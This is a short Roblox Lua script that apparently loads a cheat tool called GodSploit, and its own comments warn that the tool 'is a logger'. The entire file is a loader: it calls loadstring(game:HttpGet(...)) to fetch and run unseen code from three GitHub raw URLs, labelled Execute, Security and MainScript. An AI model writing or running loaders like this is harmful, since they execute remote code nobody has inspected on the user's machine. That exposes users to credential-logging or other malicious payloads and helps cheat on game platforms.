--just for some godsploit antirats test
-- use it at your risk cuz godsploit is a logger.
repeat task.wait() until game:IsLoaded()

local MainScriptLoadstring = "https://raw.githubusercontent.com/AlSploit/GodSploit/main/MainScript"
local SecurityLoadstring = "https://raw.githubusercontent.com/AlSploit/GodSploit/main/Security"

local Data = loadstring(game:HttpGet("https://raw.githubusercontent.com/AlSploit/GodSploit/main/Execute", true))()

local function InitMainScript()
	task.spawn(function()
		loadstring(game:HttpGet(MainScriptLoadstring))()
	end)	
end

local function InitSecurity()
	task.spawn(function()
		loadstring(game:HttpGet(SecurityLoadstring))()
	end)
end

task.spawn(function()
	task.spawn(function()
		InitSecurity()
	end)

	task.wait()

	task.spawn(function()
		InitMainScript()
	end)
end)
